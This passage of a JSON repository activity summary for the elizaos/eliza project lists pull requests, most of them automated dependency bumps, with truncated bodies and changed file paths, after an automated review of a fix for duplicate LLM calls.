provider presence\n- Providers still enrich state (lines 863-871) but no longer force re-generation of already-streamed responses\n\n**Impact:**\n- Eliminates duplicate streaming when URLs are detected (previously triggered ATTACHMENTS provider → action path → second LLM call)\n- Reduces token costs by avoiding unnecessary second LLM invocation\n- Response text from first `runSingleShotCore` call is now correctly used as final output\n\n<h3>Confidence Score: 5/5</h3>\n\n- This PR is safe to merge with minimal risk\n- Simple, surgical fix that removes a single condition causing unintended behavior. The logic is sound: providers enrich state (already handled separately at L863-871) but shouldn't force action-based execution when the response is already generated and streamed. No new code paths, no breaking changes.\n- No files require special attention\n\n<h3>Important Files Changed</h3>\n\n\n\n\n| Filename | Overview |\n|----------|----------|\n| packages/typescript/src/services/message.ts | Removed providers check from `isSimple` determination to prevent duplicate LLM calls when URLs trigger provider enrichment |\n\n</details>\n\n\n\n<sub>Last reviewed commit: 681b3d8</sub>\n\n<!-- greptile_other_comments_section -->\n\n<sub>(2/5) Greptile learns from your feedback when you react with thumbs up/down!</sub>\n\n<!-- /greptile_comment -->",
+      "repository": "elizaos/eliza",
+      "createdAt": "2026-02-23T11:57:16Z",
+      "mergedAt": null,
+      "additions": 648511,
+      "deletions": 299259
+    }
+  ],
+  "codeChanges": {
+    "additions": 21373,
+    "deletions": 3918,
+    "files": 386,
+    "commitCount": 839
+  },
+  "completedItems": [
+    {
+      "title": "chore(deps): bump cryptography from 46.0.5 to 46.0.6 in /packages/python in the uv group across 1 directory",
+      "prNumber": 6696,
+      "type": "other",
+      "body": "Bumps the uv group with 1 update in the /packages/python directory: [cryptography](https://github.com/pyca/cryptography).\n\nUpdates `cryptography` from 46.0.5 to 46.0.6\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"http",
+      "files": [
+        "packages/python/uv.lock"
+      ]
+    },
+    {
+      "title": "Shaw/reflection runtime sync",
+      "prNumber": 6721,
+      "type": "other",
+      "body": "Fix runtime reflection stuff\n\n<!-- greptile_comment -->\n\n<h3>Greptile Summary</h3>\n\nThis PR wires up task-completion assessment into the reflection evaluator pipeline: the model is now asked whether the current task is done, the result is p",
+      "files": []
+    },
+    {
+      "title": "chore(deps): bump the cargo group across 21 directories with 6 updates",
+      "prNumber": 6724,
+      "type": "other",
+      "body": "Bumps the cargo group with 3 updates in the /packages/examples/a2a/rust directory: [bytes](https://github.com/tokio-rs/bytes), [quinn-proto](https://github.com/quinn-rs/quinn) and [rustls-webpki](https://github.com/rustls/webpki).\nBumps the",
+      "files": [
+        "packages/examples/a2a/rust/Cargo.lock",
+        "packages/examples/app/tauri/src-tauri/Cargo.lock",
+        "packages/examples/autonomous/rust/autonomous/Cargo.lock",
+        "packages/examples/aws/rust/Cargo.lock",
+        "packages/examples/bluesky/rust/bluesky-agent/Cargo.lock",
+        "packages/examples/chat/rust/chat/Cargo.lock",
+        "packages/examples/cloudflare/rust-worker/Cargo.lock",
+        "packages/examples/discord/rust/discord-agent/Cargo.lock",
+        "packages/examples/form/rust/chat/Cargo.lock",
+        "packages/examples/game-of-life/rust/game-of-life/Cargo.lock",
+        "packages/examples/gcp/rust/Cargo.lock",
+        "packages/examples/polymarket/rust/polymarket-demo/Cargo.lock",
+        "packages/examples/rest-api/actix/Cargo.lock",
+        "packages/examples/rest-api/axum/Cargo.lock",
+        "packages/examples/rest-api/rocket/Cargo.lock",
+        "packages/examples/roblox/rust/Cargo.lock",
+        "packages/examples/telegram/rust/telegram-agent/Cargo.lock",
+        "packages/examples/text-adventure/rust/game/Cargo.lock",
+        "packages/examples/tic-tac-toe/rust/Cargo.lock",
+        "packages/examples/twitter-xai/rust/xai-agent/Cargo.lock",
+        "packages/examples/virus/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): bump the npm_and_yarn group across 11 directories with 5 updates",
+      "prNumber": 6723,
+      "type": "other",
+      "body": "Bumps the npm_and_yarn group with 1 update in the /packages/agent directory: [drizzle-orm](https://github.com/drizzle-team/drizzle-orm).\nBumps the npm_and_yarn group with 1 update in the /packages/benchmarks/solana/solana-gym-env/docs/traje",
+      "files": [
+        "packages/agent/package.json",
+        "packages/benchmarks/solana/solana-gym-env/docs/trajectory-viewer/package.json",
+        "packages/examples/_app/package.json",
+        "packages/examples/app/capacitor/frontend/package.json",
+        "packages/examples/app/electron/backend/package.json",
+        "packages/examples/app/electron/frontend/package.json",
+        "packages/examples/app/tauri/frontend/package.json",
+        "packages/examples/elizagotchi/package.json",
+        "packages/examples/react-wasm/package.json",
+        "packages/examples/react/package.json",
+        "packages/native-plugins/agent/package-lock.json",
+        "packages/native-plugins/agent/package.json"
+      ]
+    },
+    {
+      "title": "feat(core): shared batch-queue drains and bounded knowledge embeddings",
+      "prNumber": 6722,
+      "type": "feature",
+      "body": "Introduce utils/batch-queue (PriorityQueue, BatchProcessor, TaskDrain, BatchQueue, Semaphore) so embedding drains, action-filter index build, prompt-batcher affinity tasks, and knowledge embedding paths share one concurrency/retry/task stor",
+      "files": [
+        "packages/docs/docs.json",
+        "packages/docs/guides/background-tasks.mdx",
+        "packages/docs/runtime/batch-queue.mdx",
+        "packages/docs/runtime/core.mdx",
+        "packages/typescript/CHANGELOG.md",
+        "packages/typescript/README.md",
+        "packages/typescript/ROADMAP.md",
+        "packages/typescript/docs/BATCH_QUEUE.md",
+        "packages/typescript/docs/DESIGN.md",
+        "packages/typescript/src/__tests__/batch-queue.test.ts",
+        "packages/typescript/src/__tests__/task-drain.test.ts",
+        "packages/typescript/src/features/knowledge/document-processor.ts",
+        "packages/typescript/src/features/knowledge/llm.ts",
+        "packages/typescript/src/index.browser.ts",
+        "packages/typescript/src/index.edge.ts",
+        "packages/typescript/src/index.node.ts",
+        "packages/typescript/src/runtime.ts",
+        "packages/typescript/src/services/action-filter.ts",
+        "packages/typescript/src/services/embedding.ts",
+        "packages/typescript/src/utils/batch-queue.ts",
+        "packages/typescript/src/utils/batch-queue/batch-processor.ts",
+        "packages/typescript/src/utils/batch-queue/index.ts",
+        "packages/typescript/src/utils/batch-queue/priority-queue.ts",
+        "packages/typescript/src/utils/batch-queue/semaphore.ts",
+        "packages/typescript/src/utils/batch-queue/task-drain.ts",
+        "packages/typescript/src/utils/prompt-batcher/batcher.ts",
+        "packages/typescript/src/utils/prompt-batcher/shared.ts"
+      ]
+    },
+    {
+      "title": "feat: pipeline hooks",
+      "prNumber": 6733,
+      "type": "feature",
+      "body": "useful for DPE prompt optimizer, plugin-typography and more\r\n\r\n<!-- CURSOR_SUMMARY -->\r\n---\r\n\r\n> [!NOTE]\r\n> **Medium Risk**\r\n> Moderate risk due to workspace/dependency reshaping (plugins now pulled from `alpha` releases instead of workspac",
+      "files": [
+        "apps/app-companion/package.json",
+        "apps/app-companion/src/ambient-modules.d.ts",
+        "apps/app-companion/tsconfig.json",
+        "package.json",
+        "packages/agent/package.json",
+        "packages/agent/src/actions/calendar.ts",
+        "packages/agent/src/actions/entity-actions.ts",
+        "packages/agent/src/actions/gmail.ts",
+        "packages/agent/src/actions/grounded-action-reply.test.ts",
+        "packages/agent/src/actions/grounded-action-reply.ts",
+        "packages/agent/src/actions/inbox.ts",
+        "packages/agent/src/actions/life-param-extractor-real.test.ts",
+        "packages/agent/src/actions/life-recent-context.ts",
+        "packages/agent/src/actions/lifeops-google-helpers.test.ts",
+        "packages/agent/src/actions/lifeops-google-helpers.ts",
+        "packages/agent/src/actions/read-channel.ts",
+        "packages/agent/src/actions/search-conversations.ts",
+        "packages/agent/src/actions/send-admin-message.ts",
+        "packages/agent/src/actions/send-message.ts",
+        "packages/agent/src/actions/skill-command.ts",
+        "packages/agent/src/actions/terminal.ts",
+        "packages/agent/src/actions/timezone-normalization.ts",
+        "packages/agent/src/actions/web-search.ts",
+        "packages/agent/src/api/agent-status-routes.ts",
+        "packages/agent/src/api/app-package-routes.ts",
+        "packages/agent/src/api/apps-routes.ts",
+        "packages/agent/src/api/avatar-routes.ts",
+        "packages/agent/src/api/binance-skill-helpers.ts",
+        "packages/agent/src/api/bluebubbles-routes.ts",
+        "packages/agent/src/api/browser-workspace-routes.ts",
+        "packages/agent/src/api/bsc-trade.ts",
+        "packages/agent/src/api/chat-augmentation.ts",
+        "packages/agent/src/api/chat-routes.ts",
+        "packages/agent/src/api/cloud-billing-routes.ts",
+        "packages/agent/src/api/cloud-provisioning.ts",
+        "packages/agent/src/api/cloud-relay-routes.ts",
+        "packages/agent/src/api/cloud-routes.ts",
+        "packages/agent/src/api/config-routes.ts",
+        "packages/agent/src/api/connector-routes.ts",
+        "packages/agent/src/api/conversation-routes.ts",
+        "packages/agent/src/api/discord-avatar-cache.ts",
+        "packages/agent/src/api/discord-local-routes.ts",
+        "packages/agent/src/api/drop-routes.ts",
+        "packages/agent/src/api/health-routes.ts",
+        "packages/agent/src/api/imessage-routes.ts",
+        "packages/agent/src/api/inbox-routes.ts",
+        "packages/agent/src/api/knowledge-routes.ts",
+        "packages/agent/src/api/mcp-routes.ts",
+        "packages/agent/src/api/misc-routes.ts",
+        "packages/agent/src/api/model-provider-helpers.ts",
+        "apps/app-lifeops/package.json",
+        "apps/app-lifeops/src/lifeops/telegram-auth.ts",
+        "cloud",
+        "packages/agent/src/actions/context-signal.ts",
+        "packages/agent/src/api/plugin-discovery-helpers.ts",
+        "packages/agent/src/api/plugin-routes.ts",
+        "packages/agent/src/api/server-auth.ts",
+        "packages/agent/src/api/server-helpers-swarm.ts",
+        "packages/agent/src/api/server-types.ts",
+        "packages/agent/src/api/server.ts",
+        "packages/agent/src/api/skill-discovery-helpers.ts",
+        "packages/agent/src/index.ts",
+        "packages/agent/src/runtime/first-time-setup.ts",
+        "packages/agent/src/runtime/roles/src/utils.ts",
+        "packages/agent/src/runtime/task-heartbeat.ts",
+        "packages/agent/src/runtime/trajectory-storage.ts",
+        "packages/agent/src/services/built-in-app-routes/hyperscape.ts",
+        "packages/agent/src/services/character-persistence.ts",
+        "packages/agent/src/services/client-chat-sender.ts",
+        "packages/agent/src/triggers/runtime.ts",
+        "packages/agent/tsconfig.json",
+        "packages/app-core/package.json",
+        "packages/app-core/platforms/electrobun/native/macos/window-effects.mm",
+        "packages/app-core/src/runtime/eliza.ts",
+        "packages/app-core/tsconfig.json",
+        "packages/docs/package.json",
+        "packages/python/package.json",
+        "packages/python/scripts/typecheck-or-skip.sh",
+        "packages/rust/package.json",
+        "packages/rust/scripts/test-or-skip.sh",
+        "packages/rust/scripts/typecheck-or-skip.sh",
+        "packages/shared/tsconfig.json",
+        "packages/skills/package.json",
+        "packages/typescript/CHANGELOG.md",
+        "packages/typescript/README.md",
+        "packages/typescript/ROADMAP.md",
+        "packages/typescript/package.json",
+        "packages/typescript/src/__tests__/batch-queue.test.ts",
+        "packages/typescript/src/__tests__/native-runtime-features.test.ts"
+      ]
+    },
+    {
+      "title": "chore(deps): bump rustls-webpki from 0.103.9 to 0.103.11 in /packages/examples/autonomous-rust-agent in the cargo group across 1 directory",
+      "prNumber": 6732,
+      "type": "other",
+      "body": "Bumps the cargo group with 1 update in the /packages/examples/autonomous-rust-agent directory: [rustls-webpki](https://github.com/rustls/webpki).\n\nUpdates `rustls-webpki` from 0.103.9 to 0.103.11\n<details>\n<summary>Release notes</summary>\n<",
+      "files": [
+        "packages/examples/autonomous-rust-agent/Cargo.lock",
+        "packages/examples/farcaster/rust/farcaster-agent/Cargo.toml"
+      ]
+    },
+    {
+      "title": "chore(deps): bump rand from 0.8.5 to 0.9.2 in /packages/examples/twitter-xai/rust/xai-agent in the cargo group across 1 directory",
+      "prNumber": 6730,
+      "type": "other",
+      "body": "Bumps the cargo group with 1 update in the /packages/examples/twitter-xai/rust/xai-agent directory: [rand](https://github.com/rust-random/rand).\n\nUpdates `rand` from 0.8.5 to 0.9.2\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from ",
+      "files": [
+        "packages/examples/twitter-xai/rust/xai-agent/Cargo.lock",
+        "packages/examples/twitter-xai/rust/xai-agent/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update rust crate which to v8",
+      "prNumber": 6946,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [which](https://redirect.github.com/harryfei/which-rs) | dependencies | major | `6.0` → `8.0` |\n\n---\n\n> [!WARNING]\n> Some dependencies could n",
+      "files": [
+        "packages/rust/Cargo.lock",
+        "packages/rust/Cargo.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update react monorepo to v19 (major)",
+      "prNumber": 6945,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/docs/trajectory-viewer/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency vite to v8",
+      "prNumber": 6944,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [vite](https://vite.dev) ([source](http",
+      "files": [
+        "packages/elizaos/templates/plugin/typescript/package.json",
+        "packages/templates/plugin/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency uuid to v13",
+      "prNumber": 6943,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [uuid](https://redirect.github.com/uuid",
+      "files": [
+        "apps/app-form/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency undici to v8",
+      "prNumber": 6942,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [undici](https://undici.nodejs.org) ([s",
+      "files": [
+        "packages/app-core/package.json",
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency tailwind-merge to v3",
+      "prNumber": 6941,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [tailwind-merge](https://redirect.githu",
+      "files": [
+        "packages/app-core/package.json",
+        "packages/ui/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency rich to v15",
+      "prNumber": 6940,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [rich](https://redirect.github.com/Text",
+      "files": [
+        "packages/benchmarks/adhdbench/pyproject.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency recharts to v3",
+      "prNumber": 6939,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [recharts](https://redirect.github.com/",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/docs/trajectory-viewer/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency react-router-dom to v7",
+      "prNumber": 6938,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [react-router-dom](https://redirect.git",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/docs/trajectory-viewer/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency react-markdown to v10",
+      "prNumber": 6937,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [react-markdown](https://redirect.githu",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/docs/trajectory-viewer/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency pytz to v2026",
+      "prNumber": 6936,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [pytz](http://pythonhosted.org/pytz) | ",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency pytest-xprocess to v1",
+      "prNumber": 6935,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [pytest-xprocess](https://redirect.gith",
+      "files": [
+        "packages/elizaos/templates/plugin/python/pyproject.toml",
+        "packages/templates/plugin/python/pyproject.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency pytest-asyncio to v1",
+      "prNumber": 6934,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [pytest-asyncio](https://redirect.githu",
+      "files": [
+        "packages/benchmarks/adhdbench/pyproject.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency pytest to v9",
+      "prNumber": 6933,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [pytest](https://redirect.github.com/py",
+      "files": [
+        "packages/benchmarks/adhdbench/pyproject.toml"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency psutil to v7",
+      "prNumber": 6932,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [psutil](https://redirect.github.com/gi",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency org.jetbrains.kotlin:kotlin-gradle-plugin to v2",
+      "prNumber": 6931,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/app-core/platforms/android/build.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency lucide-react to v1",
+      "prNumber": 6930,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [lucide-react](https://lucide.dev) ([so",
+      "files": [
+        "apps/app-companion/package.json",
+        "apps/app-lifeops/package.json",
+        "apps/app-shopify/package.json",
+        "apps/app-steward/package.json",
+        "apps/app-task-coordinator/package.json",
+        "apps/app-vincent/package.json",
+        "packages/app-core/package.json",
+        "packages/ui/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency jsdom to v29",
+      "prNumber": 6929,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [jsdom](https://redirect.github.com/jsd",
+      "files": [
+        "packages/agent/package.json",
+        "packages/elizaos/templates/fullstack-app/apps/app/package.json",
+        "packages/templates/fullstack-app/apps/app/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency gymnasium to v1",
+      "prNumber": 6928,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/OSWorld/pyproject.toml",
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py",
+        "packages/benchmarks/OSWorld/uv.lock"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency file-type to v22",
+      "prNumber": 6927,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [file-type](https://redirect.github.com",
+      "files": [
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency commander to v14",
+      "prNumber": 6926,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [commander](https://redirect.github.com",
+      "files": [
+        "packages/app-core/package.json",
+        "packages/elizaos/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency com.squareup.okhttp3:okhttp to v5",
+      "prNumber": 6925,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [com.squareup.okhttp3:okhttp](https://s",
+      "files": [
+        "packages/native-plugins/gateway/android/build.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency com.android.tools.build:gradle to v9",
+      "prNumber": 6924,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [com.android.tools.build:gradle](https:",
+      "files": [
+        "packages/app-core/platforms/android/build.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency bs58 to v6",
+      "prNumber": 6923,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [bs58](https://redirect.github.com/cryp",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/voyager/skill_runner/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @xterm/xterm to v6",
+      "prNumber": 6922,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@xterm/xterm](https://redirect.github.",
+      "files": [
+        "apps/app-task-coordinator/package.json",
+        "packages/app-core/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @solana/kit to v6",
+      "prNumber": 6921,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/voyager/skill_runner/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @openrouter/ai-sdk-provider to v2",
+      "prNumber": 6920,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@openrouter/ai-sdk-provider](https://r",
+      "files": [
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @octokit/rest to v22",
+      "prNumber": 6919,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@octokit/rest](https://redirect.github",
+      "files": [
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @noble/hashes to v2",
+      "prNumber": 6918,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@noble/hashes](https://paulmillr.com/n",
+      "files": [
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @noble/ciphers to v2",
+      "prNumber": 6917,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@noble/ciphers](https://paulmillr.com/",
+      "files": [
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @clack/prompts to v1",
+      "prNumber": 6916,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@clack/prompts](https://redirect.githu",
+      "files": [
+        "packages/elizaos/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update supabase/postgres docker tag to v17",
+      "prNumber": 6915,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| supabase/postgres | major | `15.1.0.147` → `17.6.1.107` |\n\n---\n\n> [!WARNING]\n> Some dependencies could not be looked up. Check the [Dependency Dashboard]",
+      "files": [
+        "packages/app-core/deploy/docker-compose.supabase-db.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update storybook monorepo to v10 (major)",
+      "prNumber": 6914,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "apps/app-companion/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update softprops/action-gh-release action to v3",
+      "prNumber": 6913,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [softprops/action-gh-release](https://redirect.github.com/softprops/action-gh-release) | action | major | `v1` → `v3` |\n| [softprops/action-gh",
+      "files": [
+        ".github/workflows/build-android.yml",
+        ".github/workflows/build-electron.yml",
+        ".github/workflows/build-ios.yml",
+        ".github/workflows/release-rust.yaml",
+        ".github/workflows/release.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate thiserror to v2",
+      "prNumber": 6912,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [thiserror](https://redirect.github.com/dtolnay/thiserror) | workspace.dependencies | major | `1.0` → `2.0` |\n\n---\n\n> [!WARNING]\n> Some depend",
+      "files": [
+        "packages/benchmarks/HyperliquidBench/Cargo.toml"
+      ]
+    },
+    {
+      "title": "chore(deps): update peaceiris/actions-gh-pages action to v4",
+      "prNumber": 6911,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [peaceiris/actions-gh-pages](https://redirect.github.com/peaceiris/actions-gh-pages) | action | major | `v3` → `v4` |\n\n---\n\n> [!WARNING]\n> Som",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/.github/workflows/deploy-trajectory-viewer.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update oven-sh/setup-bun action to v2",
+      "prNumber": 6910,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [oven-sh/setup-bun](https://redirect.github.com/oven-sh/setup-bun) | action | major | `v1` → `v2` |\n\n---\n\n> [!WARNING]\n> Some dependencies cou",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/.github/workflows/deploy-trajectory-viewer.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update node.js to v24",
+      "prNumber": 6909,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Type | Update | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovateb",
+      "files": [
+        ".github/workflows/release-computeruse-npm.yaml",
+        ".github/workflows/sync-next-dist-tags.yaml",
+        ".nvmrc",
+        "package.json",
+        "packages/app-core/deploy/Dockerfile.cloud-agent",
+        "packages/benchmarks/gauntlet/sdk/typescript/package.json",
+        "packages/benchmarks/openclaw-benchmark/bmadmethod/Dockerfile",
+        "packages/benchmarks/openclaw-benchmark/ohmyopencode/Dockerfile",
+        "packages/benchmarks/openclaw-benchmark/openclaw/Dockerfile",
+        "packages/benchmarks/openclaw-benchmark/ralphy/Dockerfile",
+        "packages/native-plugins/macosalarm/package.json",
